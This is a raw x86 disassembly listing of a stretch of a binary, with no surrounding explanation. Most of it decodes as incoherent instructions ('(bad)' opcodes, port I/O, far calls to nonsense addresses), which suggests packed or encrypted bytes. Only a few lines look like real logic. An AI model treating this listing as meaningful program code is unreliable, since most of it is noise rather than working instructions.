  40ddbb:	cmp    esp,DWORD PTR [ebx+0x6e]
  40ddbe:	pop    eax
  40ddbf:	dec    ecx
  40ddc0:	in     eax,dx
  40ddc1:	or     al,0x98
  40ddc3:	xchg   ecx,eax
  40ddc4:	addr16 inc ebp
  40ddc6:	les    edx,FWORD PTR [ebx]
  40ddc8:	adc    DWORD PTR [ebx+0x4a],ecx
  40ddcb:	mov    edx,ds
  40ddcd:	mov    DWORD PTR [edi],esp
  40ddcf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddd0:	mov    ebx,0x39697db
  40ddd5:	mov    ?,WORD PTR [esi]
  40ddd7:	lds    ebp,FWORD PTR [esi]
  40ddd9:	jnp    0x40de41
  40dddb:	out    0xcf,al
  40dddd:	xor    DWORD PTR [edx+0x4a4988cc],edi
  40dde3:	(bad)  
  40dde4:	cld    
  40dde5:	les    esp,FWORD PTR [eax+0x1f]
  40dde8:	or     BYTE PTR [ebx-0x44],al
  40ddeb:	adc    DWORD PTR [ebp-0x5b],esp
  40ddee:	adc    al,0xf
  40ddf0:	outs   dx,BYTE PTR ds:[esi]
  40ddf1:	adc    eax,0x82bdb904
  40ddf6:	pop    edx
  40ddf7:	das    
  40ddf8:	jbe    0x40dd93
  40ddfa:	sub    ecx,ebp
  40ddfc:	xchg   ecx,eax
  40ddfd:	add    bh,BYTE PTR [edx]
  40ddff:	loopne 0x40dd88
  40de01:	dec    esp
  40de02:	mov    ecx,0x3242922c
  40de07:	shl    DWORD PTR [edi],0xca
  40de0a:	mov    edi,0x350b20f2
  40de0f:	cs jl  0x40ddc0
  40de12:	(bad)  
  40de14:	lahf   
  40de15:	frstor [ebx+eiz*1-0x4b]
  40de19:	sub    DWORD PTR [ebx-0x10],eax
  40de1c:	pop    ebx
  40de1d:	and    al,0x33
  40de1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de20:	and    eax,0x61592832
  40de25:	jo     0x40ddbd
  40de27:	dec    ebx
  40de28:	add    edi,DWORD PTR [edx+0x21]
  40de2b:	leave  
  40de2c:	stos   BYTE PTR es:[edi],al
  40de2d:	push   ebp
  40de2e:	xchg   esp,eax
  40de2f:	jl     0x40de14
  40de31:	lock jl 0x40de03
  40de34:	test   DWORD PTR [ecx],ecx
  40de36:	xor    eax,0xa26e81c4
  40de3b:	xor    al,BYTE PTR [edx-0xc540798]
  40de41:	cld    
  40de42:	add    al,0xa
  40de44:	outs   dx,DWORD PTR ds:[esi]
  40de45:	mov    edi,0x9d2afd9f
  40de4a:	mov    dh,0xab
  40de4c:	stos   BYTE PTR es:[edi],al
  40de4d:	sub    DWORD PTR fs:[eax-0x411b3bc],0xffffffb7
  40de55:	add    esi,DWORD PTR [edi+edi*1+0x24]
  40de59:	(bad)  
  40de5b:	xchg   ebp,ebp
  40de5d:	mov    dh,0x36
  40de5f:	jne    0x40dea8
  40de61:	or     eax,0x2cb1be09
  40de66:	xchg   edx,eax
  40de67:	xor    eax,DWORD PTR [ecx+0x5c]
  40de6a:	xchg   ebx,eax
  40de6b:	aam    0x1a
  40de6d:	pop    ecx
  40de6e:	aad    0x89
  40de70:	jb     0x40de02
  40de72:	xor    eax,0x8bf85589
  40de77:	push   ebp
  40de78:	loopne 0x40dead
  40de7a:	sar    BYTE PTR [edi-0x327299],1
  40de80:	jmp    0x40e297
  40de85:	sahf   
  40de86:	call   0xb371:0x5de417d8
  40de8d:	adc    al,0xe5
  40de8f:	and    DWORD PTR [edx],edx
  40de91:	push   esi
  40de92:	jle    0x40deac
  40de94:	sbb    DWORD PTR [esi+ebp*4],esi
  40de97:	jle    0x40df17
  40de99:	jo     0x40df14
  40de9b:	jle    0x40df1b
  40de9d:	mov    ah,0xbb
  40de9f:	mov    ch,0x5a
  40dea1:	fimul  WORD PTR [esi-0x3600cad]
  40dea7:	data16 add BYTE PTR ds:0x587de3d2,ch
  40deae:	dec    ecx
  40deaf:	add    DWORD PTR [ecx],ebx
  40deb1:	xchg   edx,eax
  40deb2:	jge    0x40deef
  40deb4:	or     BYTE PTR [esi],ah
  40deb6:	popf   
  40deb7:	addr16 jo 0x40de9d
  40deba:	inc    ecx
  40debb:	or     al,0xe1
  40debd:	rcl    BYTE PTR [ebp+0x28],cl
  40dec0:	add    eax,0xb616c4b0
  40dec5:	shl    BYTE PTR [ebx+0x1c],1
  40dec8:	and    DWORD PTR [esi-0x33],edx
  40decb:	(bad)  
  40decc:	loope  0x40deb1
  40dece:	pop    ebp
  40decf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ded0:	xchg   ebp,eax
  40ded1:	xchg   ebx,eax
  40ded2:	cmp    ebp,eax
  40ded4:	mov    ah,0xed
  40ded6:	in     eax,0x4f
  40ded8:	sub    eax,0xe1bf5a23
  40dedd:	add    BYTE PTR [ebp-0x21],dl
  40dee0:	pop    ss
  40dee1:	or     BYTE PTR [bx+si+0x67],0x7d
  40dee6:	pop    ebx
  40dee7:	add    eax,0xaf2b85f9
  40deec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40deed:	jl     0x40df4f
  40deef:	(bad)  
  40def0:	xor    dh,BYTE PTR [eax]
  40def2:	dec    ebx
  40def3:	into   
  40def4:	lods   eax,DWORD PTR ds:[esi]
  40def5:	sar    DWORD PTR ds:0xb1ee087d,0xe8
  40defc:	mov    edx,0xfa111db8
  40df01:	cwde   
  40df02:	in     eax,dx
  40df03:	xchg   esp,eax
  40df04:	sub    BYTE PTR [edx+0x3e0c0156],dl
  40df0a:	out    0xc8,al
  40df0c:	pop    eax
  40df0d:	push   ss
  40df0e:	jns    0x40df8f
  40df10:	(bad)  
  40df11:	xor    al,0x54
  40df13:	mov    ebp,0xc8e221f1
  40df18:	ja     0x40dec3
  40df1a:	adc    BYTE PTR [eax+edx*4-0xa687aed],0x12
  40df22:	outs   dx,DWORD PTR ds:[esi]
  40df23:	jg     0x40df51
  40df25:	sbb    cl,ch
  40df27:	jnp    0x40deb8
  40df29:	sub    BYTE PTR [ebx-0x78],bh
  40df2c:	cwde   
  40df2d:	pop    edi
  40df2e:	mov    ah,0x46
  40df30:	aaa    
  40df31:	test   DWORD PTR [edx],esp
  40df33:	jnp    0x40ded9
  40df35:	cwde   
  40df36:	test   BYTE PTR [ebp-0x1a73a79e],cl
  40df3c:	xlat   BYTE PTR ds:[ebx]
  40df3d:	adc    al,0xcf
  40df3f:	sub    ah,BYTE PTR [eax]
  40df41:	repz adc eax,0x62aba90d
  40df47:	aad    0xcd
  40df49:	aas    
  40df4a:	jo     0x40df22
  40df4c:	xor    ebp,DWORD PTR [esi+0x2aad8708]
  40df52:	push   di
  40df54:	lea    ebx,[ecx-0x4f20c515]
  40df5a:	xchg   bh,dh
  40df5c:	and    al,0x6d
  40df5e:	test   DWORD PTR [edi],eax
  40df60:	in     eax,0xce
  40df62:	test   BYTE PTR [eax-0x308255b1],dh
  40df68:	dec    esp
  40df69:	test   DWORD PTR [edx-0x576ca30c],eax
  40df6f:	out    0xa1,al
  40df71:	add    edx,DWORD PTR [ebp-0x18]
  40df74:	sti    
  40df75:	xchg   BYTE PTR [esi+0x70685ca4],ch
  40df7b:	xor    bh,al
  40df7d:	sar    dh,1
  40df7f:	dec    edi
  40df80:	push   es
  40df81:	pop    edi
  40df82:	and    BYTE PTR ds:0xa382a6f8,bh
  40df88:	ficomp DWORD PTR [ebx]
  40df8a:	das    
  40df8b:	jecxz  0x40df31
  40df8d:	lock mov fs,WORD PTR [esi+eiz*8]
  40df91:	lds    ecx,FWORD PTR [ebp-0x40]
  40df94:	push   es
  40df95:	and    BYTE PTR ds:0x25a081d,cl
  40df9b:	pop    esi
  40df9c:	cmp    DWORD PTR [edi-0x60],esp
  40df9f:	jecxz  0x40dfc8
  40dfa1:	es popf 
  40dfa3:	xlat   BYTE PTR ds:[ebx]
  40dfa4:	icebp  
  40dfa5:	popa   
  40dfa6:	hlt    
  40dfa7:	mov    edi,0x503c3add
  40dfac:	mov    esp,DWORD PTR [ecx+eax*2+0x222f84a8]
  40dfb3:	retf   0x1ba
  40dfb6:	pop    es
  40dfb7:	xlat   BYTE PTR ds:[ebx]
  40dfb8:	jmp    0x40e031
  40dfba:	aad    0xd
  40dfbc:	xor    DWORD PTR [edx],0x309d267a
  40dfc2:	out    0xd3,al
  40dfc4:	mov    esi,0x6d22309c
  40dfc9:	enter  0x2f21,0x84
  40dfcd:	hlt    
  40dfce:	pusha  
  40dfcf:	clc    
  40dfd0:	inc    eax
  40dfd1:	or     al,0x6f
  40dfd3:	mov    esp,0x58022f45
  40dfd8:	clc    
  40dfd9:	xor    dl,BYTE PTR [esi+0x62]
  40dfdc:	xchg   esp,eax
  40dfdd:	mov    ebp,DWORD PTR [ebp-0x667bd7c]
  40dfe3:	dec    edi
  40dfe4:	fcmove st,st(2)
  40dfe6:	sbb    BYTE PTR [esi],cl
  40dfe8:	or     eax,0xec6bf83e
  40dfed:	hlt    
  40dfee:	jno    0x40dfdf
  40dff0:	fcomp  QWORD PTR [eax]
  40dff2:	ret    0xd349
  40dff5:	ror    DWORD PTR [eax],1
  40dff7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dff8:	mov    ecx,DWORD PTR [eax-0x53]
  40dffb:	or     ecx,DWORD PTR [ecx-0x70]
  40dffe:	cmp    edi,DWORD PTR [eax]
  40e000:	lahf   
  40e001:	jecxz  0x40df95
  40e003:	jne    0x40dfc8
  40e005:	xchg   ebp,eax
  40e006:	aas    
  40e007:	push   cs
  40e008:	loope  0x40e02b
  40e00a:	cli    
  40e00b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e00c:	addr16 loop 0x40e00d
  40e00f:	cmp    eax,0xd3f28561
  40e014:	mov    esp,0x7a1963ef
  40e019:	xor    eax,0xf74eba98
  40e01e:	mov    ch,0x81
  40e020:	or     eax,0xf55f5b54
  40e025:	icebp  
  40e026:	and    al,0xd5
  40e028:	mov    BYTE PTR [edi],al
  40e02a:	xchg   esp,eax
  40e02b:	dec    ecx
  40e02c:	jge    0x40dfbc
  40e02e:	xchg   ecx,eax
  40e02f:	mov    eax,ds:0x33cbfb20
  40e034:	dec    edx
  40e035:	xor    DWORD PTR [edx],0xd5ddd624
  40e03b:	push   cs
  40e03c:	aas    
  40e03d:	cmp    BYTE PTR [ebx],0x93
  40e040:	in     eax,0xfc
  40e042:	inc    DWORD PTR [ecx+edi*4+0x61]
  40e046:	hlt    
  40e047:	je     0x40e007
  40e049:	lahf   
  40e04a:	add    esi,DWORD PTR ds:0x5609262b
  40e050:	xchg   DWORD PTR [eax+0x25],esi
  40e053:	add    DWORD PTR [ecx-0x33],esi
  40e056:	ins    BYTE PTR es:[edi],dx
  40e057:	idiv   DWORD PTR [eax]
  40e059:	sub    eax,0x66373245
  40e05e:	mov    edx,0xaa20852
  40e063:	out    dx,eax
  40e064:	leave  
  40e065:	push   eax
  40e066:	enter  0x5ee8,0x52
  40e06a:	mov    esp,0x7365d765
  40e06f:	shr    DWORD PTR [edx-0x2dc6f176],1
  40e075:	fcomip st,st(5)
  40e077:	aaa    
  40e078:	imul   edi,DWORD PTR [eax+0xf],0xffffffbc
  40e07c:	xor    eax,0xaa390373
  40e081:	mov    esi,0xac486579
  40e086:	jno    0x40e027
  40e088:	pushf  
  40e089:	inc    eax
  40e08a:	inc    esp
  40e08b:	jns    0x40e0cd
  40e08d:	cld    
  40e08e:	push   edi
  40e08f:	inc    eax
  40e090:	cs push ds
  40e092:	enter  0xa180,0x59
  40e096:	sub    al,0x69
  40e098:	test   eax,0x8b8da0f
  40e09d:	leave  
  40e09e:	sbb    ebp,DWORD PTR [ebp-0xd]
  40e0a1:	test   BYTE PTR [ebp-0x7c],al
  40e0a4:	stos   DWORD PTR es:[edi],eax
  40e0a5:	adc    ebx,DWORD PTR [ebx+0x25da7474]
  40e0ab:	sets   bl
  40e0ae:	outs   dx,BYTE PTR ds:[esi]
  40e0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0b0:	cs aas 
  40e0b2:	hlt    
  40e0b3:	adc    BYTE PTR [eax],bl
  40e0b5:	cmp    DWORD PTR [edx+ebp*8+0x71],ecx
  40e0b9:	jo     0x40e0c3
  40e0bb:	xor    ch,bh
  40e0bd:	pop    edx
  40e0be:	stc    
  40e0bf:	or     cl,BYTE PTR [esp+edi*1]
  40e0c2:	sub    eax,0x66
  40e0c5:	cmp    eax,DWORD PTR [edx-0x62]
  40e0c8:	mov    edx,0x9e2ebbce
  40e0cd:	fs dec edx
  40e0cf:	in     eax,0xf3
  40e0d1:	iret   
  40e0d2:	xchg   DWORD PTR [esi-0x34],ecx
  40e0d5:	addr16 mov ds:0x92b,al
  40e0d9:	push   esi
  40e0da:	retf   
  40e0db:	mov    dh,0xe3
  40e0dd:	mov    ecx,0x70d1bc27
  40e0e2:	imul   ebp,ecx,0xffffffe1
  40e0e5:	arpl   WORD PTR ds:0x2d12c460,sp
  40e0eb:	jb     0x40e0a6
  40e0ed:	xchg   esp,eax
  40e0ee:	dec    ecx
  40e0ef:	(bad)  
  40e0f0:	adc    DWORD PTR [edx-0x39f18212],edx
  40e0f6:	mov    bh,0x56
  40e0f8:	and    eax,0x284fea5f
  40e0fd:	lea    edx,[edx-0x5e]
  40e100:	in     eax,dx
  40e101:	ror    edx,0x36
  40e104:	retf   
  40e105:	inc    edi
  40e106:	sahf   
  40e107:	fmul   DWORD PTR [esi]
  40e109:	sbb    dh,BYTE PTR [ebp-0x7f33cca]
  40e10f:	ret    0xc257
  40e112:	jge    0x40e155
  40e114:	adc    ebx,edi
  40e116:	outs   dx,DWORD PTR ds:[esi]
  40e117:	pusha  
  40e118:	in     eax,dx
  40e119:	xchg   ebp,eax
  40e11a:	jecxz  0x40e0bc
  40e11c:	mov    esi,0xa1210c5
  40e121:	int    0x16
  40e123:	inc    eax
  40e124:	shl    BYTE PTR [edx+0x2f48394a],0x92
  40e12b:	inc    eax
  40e12c:	fs scas al,BYTE PTR es:[edi]
  40e12e:	jl     0x40e19b
  40e130:	outs   dx,DWORD PTR ds:[esi]
  40e131:	mov    al,ds:0x3913558d
  40e136:	mov    esi,0xfbe8209c
  40e13b:	loope  0x40e1b4
  40e13d:	or     DWORD PTR [edi+eiz*2+0x4139b7d2],eax
  40e144:	jnp    0x40e15d
  40e146:	es mov ecx,0x7dc87000
  40e14c:	call   FWORD PTR [ebx]
  40e14e:	adc    DWORD PTR [eax-0x7b],ebp
  40e151:	or     al,0xa3
  40e153:	add    bh,BYTE PTR [eax]
  40e155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e156:	mov    al,0xa6
  40e158:	mov    dx,0xc706
  40e15c:	push   es
  40e15d:	jnp    0x40e1d5
  40e15f:	jle    0x40e16e
  40e161:	sub    cl,BYTE PTR [ecx]
  40e163:	popa   
  40e164:	cmp    eax,0xfdfaf494
  40e169:	call   0x7609:0x1a182dca
  40e170:	fdivr  st,st(4)
  40e172:	imul   DWORD PTR ds:0xebcda25a
  40e178:	pop    es
  40e179:	(bad)  [edx+0x2a]
  40e17c:	dec    edx
  40e17d:	sbb    BYTE PTR [edx],ah
  40e17f:	leave  
  40e180:	or     BYTE PTR [ecx],ah
  40e182:	ins    BYTE PTR es:[edi],dx
  40e183:	sar    BYTE PTR [ebp-0x500baeaa],1
  40e189:	popf   
  40e18a:	pop    es
  40e18b:	ins    BYTE PTR es:[edi],dx
  40e18c:	fldcw  WORD PTR [eax+0x65]
  40e18f:	imul   ebp,DWORD PTR [ebp-0x40afe2e],0x2f18575f
  40e199:	dec    esp
  40e19a:	xchg   BYTE PTR [ecx],al
  40e19c:	scas   eax,DWORD PTR es:[edi]
  40e19d:	int    0xa2
  40e19f:	pop    edi
  40e1a0:	pop    ds
  40e1a1:	or     DWORD PTR [eax-0x2581ad3a],eax
  40e1a7:	mov    ecx,edi
  40e1a9:	imul   ecx,edx,0x27
  40e1ac:	mov    dh,0x43
  40e1ae:	mov    ebx,0xe5ff29af
  40e1b3:	jecxz  0x40e233
  40e1b5:	and    ecx,0xffffffcb
  40e1b8:	ret    
  40e1b9:	jnp    0x40e163
  40e1bb:	mov    ah,0xe7
  40e1bd:	and    al,0x11
  40e1bf:	iret   
  40e1c0:	sbb    cl,al
  40e1c2:	cmp    eax,0x2d5cff0a
  40e1c7:	fisub  DWORD PTR [eax-0x60]
  40e1ca:	cmp    DWORD PTR [eax-0x38],0x2b602fc7
  40e1d1:	jle    0x40e1b1
  40e1d3:	cwde   
  40e1d4:	push   eax
  40e1d5:	pusha  
  40e1d6:	pushf  
  40e1d7:	clc    
  40e1d8:	jne    0x40e1dc
  40e1da:	push   ss
  40e1db:	pop    eax
  40e1dc:	mov    BYTE PTR [ebx-0x1887b69],dl
  40e1e2:	(bad)  
  40e1e3:	in     eax,0xb0
  40e1e5:	lods   eax,DWORD PTR ds:[esi]
  40e1e6:	leave  
  40e1e7:	mov    ecx,0x437dbbdd
  40e1ec:	sti    
  40e1ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e1ee:	popa   
  40e1ef:	pop    edx
  40e1f0:	mov    DWORD PTR [ecx+0x680b393d],esi
  40e1f6:	(bad)  
  40e1f7:	mov    dl,ch
  40e1f9:	hlt    
  40e1fa:	in     eax,0x22
  40e1fc:	xchg   dl,bh
  40e1fe:	pop    edx
  40e1ff:	loop   0x40e1d6
  40e201:	lods   al,BYTE PTR ds:[esi]
  40e202:	inc    ebx
  40e203:	push   ss
  40e204:	lahf   
  40e205:	mov    cl,0x7f
  40e207:	popf   
  40e208:	jmp    0xc0365aa9
  40e20d:	xor    BYTE PTR [eax],bl
  40e20f:	jecxz  0x40e196
  40e211:	ret    0x7fc7
  40e214:	repz sbb BYTE PTR [ebx+ecx*1-0x7157790e],dh
  40e21c:	mov    ecx,edx
  40e21e:	jg     0x40e1b6
  40e220:	je     0x40e1eb
  40e222:	mov    ebp,DWORD PTR [ebx-0x2a]
  40e225:	cmp    ah,BYTE PTR [edi+0x70ebb341]
  40e22b:	retf   
  40e22c:	pop    DWORD PTR ds:0x6fdcd72f
  40e232:	mov    ebx,0x9b2f5ce5
  40e237:	inc    esi
  40e238:	sbb    cl,dh
  40e23a:	outs   dx,DWORD PTR ds:[esi]
  40e23b:	sub    BYTE PTR [edi+0x11],ah
  40e23e:	cmp    esp,ebx
  40e240:	push   esp
  40e241:	sub    al,0x4b
  40e243:	popa   
  40e244:	cdq    
  40e245:	push   ds
  40e246:	clc    
  40e247:	fidivr DWORD PTR [ebp-0x69d8a5b4]
  40e24d:	adc    dl,ch
  40e24f:	sub    al,0x37
  40e251:	or     bl,BYTE PTR [edx+eiz*4]
  40e254:	mov    cs,esi
  40e256:	push   edx
  40e257:	pop    edx
  40e258:	pop    esi
  40e259:	(bad)  
  40e25a:	loopne 0x40e1e3
  40e25c:	mov    WORD PTR [edi-0x136f0c5a],fs
  40e262:	nop
  40e263:	pop    ebx
  40e264:	dec    edi
  40e265:	pop    ecx
  40e266:	jae    0x40e2c4
  40e268:	pop    edx
  40e269:	mov    ds:0x6906e22f,al
  40e26e:	pop    es
  40e26f:	jecxz  0x40e203
  40e271:	xor    bl,dh
  40e273:	retf   0xfcfb
  40e276:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e277:	mov    ch,0x4d
  40e279:	mov    eax,ds:0xf1e8fa69
  40e27e:	cli    
  40e27f:	call   0xeef1:0x940c25e0
  40e286:	xchg   ebp,eax
  40e287:	or     DWORD PTR [edx],0x7ae04348
  40e28d:	retf   
  40e28e:	inc    edi
  40e28f:	push   ebp
  40e290:	outs   dx,BYTE PTR ds:[esi]
  40e291:	and    esp,DWORD PTR [ebx]
  40e293:	sar    DWORD PTR [edi-0x5d4f883],1
  40e299:	add    edi,DWORD PTR [ebp-0x10]
  40e29c:	mov    edx,DWORD PTR [ebp-0x20]
  40e29f:	mov    ebx,DWORD PTR [ebp-0x8]
  40e2a2:	xor    edx,eax
  40e2a4:	add    edx,ecx
  40e2a6:	imul   edx,ebx
  40e2a9:	cmp    edx,edi
  40e2ab:	jbe    0x40a4fb
  40e2b1:	pop    ebx
  40e2b2:	jmp    0x40e6c9
  40e2b7:	mov    BYTE PTR [edi+0x6af53ecb],bl
  40e2bd:	xchg   ebp,eax
  40e2be:	imul   esp,ecx,0x965e5ddc
  40e2c4:	jg     0x40e2f6
  40e2c6:	or     DWORD PTR [esi],ebp
  40e2c8:	stos   BYTE PTR es:[edi],al
  40e2c9:	jle    0x40e349
  40e2cb:	jo     0x40e346
  40e2cd:	jle    0x40e34d
  40e2cf:	(bad)  
  40e2d0:	fcomi  st,st(4)
  40e2d2:	ja     0x40e326
  40e2d4:	(bad)  
  40e2d5:	cld    
  40e2d6:	jbe    0x40e269
  40e2d8:	fsub   QWORD PTR [ebp-0x44af58cd]
  40e2de:	in     al,dx
  40e2df:	add    DWORD PTR [edx+0x62],ebx
  40e2e2:	add    bl,BYTE PTR [esi-0x20]
  40e2e5:	leave  
  40e2e6:	(bad)  
  40e2e7:	cmp    al,0xb4
  40e2e9:	inc    edx
  40e2ea:	or     eax,0x2b52f364
  40e2ef:	out    0xfa,al
  40e2f1:	and    dh,BYTE PTR [eax+0x7086fee5]
  40e2f7:	push   ss
  40e2f8:	ins    DWORD PTR es:[edi],dx
  40e2f9:	stos   BYTE PTR es:[edi],al
  40e2fa:	push   ecx
  40e2fb:	xor    bh,BYTE PTR [ebp-0x70]
  40e2fe:	dec    esp
  40e2ff:	mov    ah,0x9d
  40e301:	mov    eax,eax
  40e303:	mov    dl,BYTE PTR [esi-0x387bb3c0]
  40e309:	jmp    0xbb23e0c
  40e30e:	xchg   edi,eax
  40e30f:	jle    0x40e305
  40e311:	cmp    DWORD PTR [edi+0x658c68c4],0x63
  40e318:	dec    esi
  40e319:	mov    ds:0xabfd6f7b,al
  40e31e:	outs   dx,DWORD PTR ds:[esi]
  40e31f:	pop    ecx
  40e320:	mov    dl,0x3c
  40e322:	sar    DWORD PTR [ebx],cl
  40e324:	pop    esi
  40e325:	mov    ds:0xde129695,eax
  40e32a:	cs data16 cld 
  40e32d:	and    DWORD PTR [eax-0x7b],edi
  40e330:	ins    DWORD PTR es:[edi],dx
  40e331:	mov    DWORD PTR [ebx-0x6c1a005c],ebp
  40e337:	(bad)  
  40e338:	cmp    eax,DWORD PTR [esi+0x10]
  40e33b:	or     eax,0xe8ae220d
  40e340:	fs dec edi
  40e342:	mov    al,0xb5
  40e344:	dec    esi
  40e345:	rcl    DWORD PTR [ecx-0x3a6685bf],cl
  40e34b:	fidiv  DWORD PTR [esi]
  40e34d:	and    DWORD PTR [edx],eax
  40e34f:	nop
  40e350:	and    BYTE PTR ds:0x8fb94d8a,dl
  40e356:	lds    ecx,FWORD PTR [esi+0x45100f49]
  40e35c:	push   edi
  40e35d:	xchg   edi,eax
  40e35e:	scas   al,BYTE PTR es:[edi]
  40e35f:	inc    esi
  40e360:	cmp    edx,DWORD PTR [edi-0x57]
  40e363:	gs mov bl,0x15
  40e366:	cdq    
  40e367:	add    edi,0x5
  40e36a:	jo     0x40e34f
  40e36c:	inc    edi
  40e36d:	pop    edx
  40e36e:	loopne 0x40e371
  40e370:	push   0x9a769e3a
  40e375:	mov    bh,0xfc
  40e377:	add    al,0xcd
  40e379:	mov    ecx,DWORD PTR [eax-0x1a43ed61]
  40e37f:	mov    esi,0xffd8a53d
  40e384:	jmp    0x1c1f47ad
  40e389:	fs loope 0x40e359
  40e38c:	mov    ah,0x27
  40e38e:	dec    edx
  40e38f:	mov    al,ds:0x49a4afa3
  40e394:	je     0x40e31c
  40e396:	bound  esp,QWORD PTR [ebx-0x54439da0]
  40e39c:	xchg   esp,edi
  40e39e:	push   es
  40e39f:	sbb    eax,0x60b1bb6e
  40e3a4:	xor    cl,dl
  40e3a6:	xor    al,dl
  40e3a8:	xchg   ebp,eax
  40e3a9:	cmp    ebp,DWORD PTR [ebx+0x64]
  40e3ac:	aas    
  40e3ad:	jns    0x40e3d6
  40e3af:	push   0x72
  40e3b1:	sub    edi,ebp
  40e3b3:	mov    ds:0x909c59e3,al
  40e3b8:	mov    edi,0xea445392
  40e3bd:	in     eax,0x3e
  40e3bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e3c0:	push   ebp
  40e3c1:	imul   eax,DWORD PTR [esi-0x54e5daf0],0xffffffa4
  40e3c8:	pop    edi
  40e3c9:	and    al,0x5e
  40e3cb:	dec    esi
  40e3cc:	mov    DWORD PTR [edx+0xb280119],ebx
  40e3d2:	jl     0x40e452
  40e3d4:	test   DWORD PTR [edi],esi
  40e3d6:	lods   eax,DWORD PTR ds:[esi]
  40e3d7:	pop    ds
  40e3d8:	xlat   BYTE PTR ds:[ebx]
  40e3d9:	xor    edx,DWORD PTR [esi+0x59bf8de0]
  40e3df:	lods   eax,DWORD PTR ds:[esi]
  40e3e0:	mov    ?,WORD PTR [ebp-0x50]
  40e3e3:	lds    edi,FWORD PTR [edx+0x6e]
  40e3e6:	in     eax,dx
  40e3e7:	(bad)  
  40e3e8:	out    dx,eax
  40e3e9:	inc    ebx
  40e3ea:	and    BYTE PTR [ecx-0x63],cl
  40e3ed:	in     al,0x50
  40e3ef:	dec    ebp
  40e3f0:	mov    cl,0xe1
  40e3f2:	shl    bh,cl
  40e3f4:	cli    
  40e3f5:	inc    edi
  40e3f6:	scas   al,BYTE PTR es:[edi]
  40e3f7:	repnz aad 0xcc
  40e3fa:	arpl   WORD PTR [edx],sp
  40e3fc:	jno    0x40e427
  40e3fe:	pushf  
  40e3ff:	pushf  
  40e400:	retf   
  40e401:	jb     0x40e42c
  40e403:	and    DWORD PTR [edx],0xffffffcb
  40e406:	cmp    ebp,esi
  40e408:	push   esp
  40e409:	pusha  
  40e40a:	sahf   
  40e40b:	das    
  40e40c:	xchg   BYTE PTR [ecx+0x76],dh
  40e40f:	neg    DWORD PTR [ebx]
  40e411:	push   es
  40e412:	adc    DWORD PTR [esi],edi
  40e414:	inc    esp
  40e415:	cmp    ebx,DWORD PTR [ecx-0x1ac123d7]
  40e41b:	inc    esi
  40e41c:	inc    ebx
  40e41d:	rcr    DWORD PTR [edi-0xf],0x48
  40e421:	pop    esi
  40e422:	xchg   edx,eax
  40e423:	int    0xf4
  40e425:	mov    ebx,0xe42a396f
  40e42a:	jae    0x40e456
  40e42c:	sbb    DWORD PTR [ecx+0x71b53904],esi
  40e432:	pop    edi
  40e433:	mov    dh,0xe6
  40e435:	add    edx,ebp
  40e437:	in     al,dx
  40e438:	fwait
  40e439:	out    0x2c,eax
  40e43b:	mov    ebx,DWORD PTR es:[ebx+0x3d]
  40e43f:	and    ch,ch
  40e441:	leave  
  40e442:	and    DWORD PTR [ebp-0x79],eax
  40e445:	into   
  40e446:	add    ebx,DWORD PTR [ecx-0x3a595014]
  40e44c:	pop    es
  40e44d:	jns    0x40e43e
  40e44f:	push   ss
  40e450:	adc    cl,BYTE PTR [ebp+0x5f]
  40e453:	jl     0x40e4a6
  40e455:	add    al,0x21
  40e457:	add    edi,esi
  40e459:	xor    bl,bl
  40e45b:	cmp    DWORD PTR [edx-0x6a],0xa266a300
  40e462:	mov    dl,0xb1
  40e464:	mov    ch,BYTE PTR [ecx+0x4bdb4219]
  40e46a:	xchg   BYTE PTR [edi-0x5],bl
  40e46d:	push   es
  40e46e:	out    0x5e,al
  40e470:	dec    eax
  40e471:	mov    DWORD PTR [eax],0x2fa5c7f0
  40e477:	scas   al,BYTE PTR es:[edi]
  40e478:	(bad)  
  40e479:	lock std 
  40e47b:	mov    bl,0x89
  40e47d:	and    eax,0xfd9deb42
  40e482:	lock xor al,0x82
  40e485:	xor    BYTE PTR [edx+0x18],al
  40e488:	inc    esp
  40e489:	or     BYTE PTR [ebx-0xcc9bab1],bl
  40e48f:	push   edi
  40e490:	mov    cl,0x24
  40e492:	sbb    DWORD PTR [eax],0xc674195f
  40e498:	xor    dl,al
  40e49a:	loopne 0x40e517
  40e49c:	adc    BYTE PTR [ebx],0xc9
  40e49f:	sub    cl,ah
  40e4a1:	in     eax,0x88
  40e4a3:	mov    ah,0x2a
  40e4a5:	ds pop ds
  40e4a7:	push   esp
  40e4a8:	mov    edi,0xba9d3a4f
  40e4ad:	jp     0x40e524
  40e4af:	arpl   WORD PTR [ebx+0x4d],sp
  40e4b2:	repz inc ebp
  40e4b4:	cmc    
  40e4b5:	call   0xafec:0xaa6b5e82
  40e4bc:	(bad)  
  40e4c0:	push   ecx
  40e4c1:	arpl   bp,cx
  40e4c3:	icebp  
  40e4c4:	ror    DWORD PTR [esi],0x2b
  40e4c7:	pop    ecx
  40e4c8:	imul   ebx,eax,0x307c03dc
  40e4ce:	ror    bh,0xd4
  40e4d1:	out    dx,al
  40e4d2:	fstp   TBYTE PTR [bx+0x5]
  40e4d6:	jnp    0x40e4f3
  40e4d8:	ja     0x40e4ed
  40e4da:	outs   dx,BYTE PTR ds:[esi]
  40e4db:	in     eax,0x23
  40e4dd:	cmp    ch,bl
  40e4df:	ret    
  40e4e0:	pop    edx
  40e4e1:	ins    DWORD PTR es:[edi],dx
  40e4e2:	dec    edi
  40e4e3:	mov    eax,0x69f3e3c8
  40e4e8:	xchg   ecx,eax
  40e4e9:	and    al,0xc4
  40e4eb:	out    0x9e,al
  40e4ed:	inc    ecx
  40e4ee:	mov    dh,0x4f
  40e4f0:	and    al,BYTE PTR [edi-0x356f8a7e]
  40e4f6:	jno    0x40e50f
  40e4f8:	lods   al,BYTE PTR ds:[esi]
  40e4f9:	ins    DWORD PTR es:[edi],dx
  40e4fa:	xor    ebx,DWORD PTR [ebx+edx*1+0x6d3be5ae]
  40e501:	or     ch,BYTE PTR [eax]
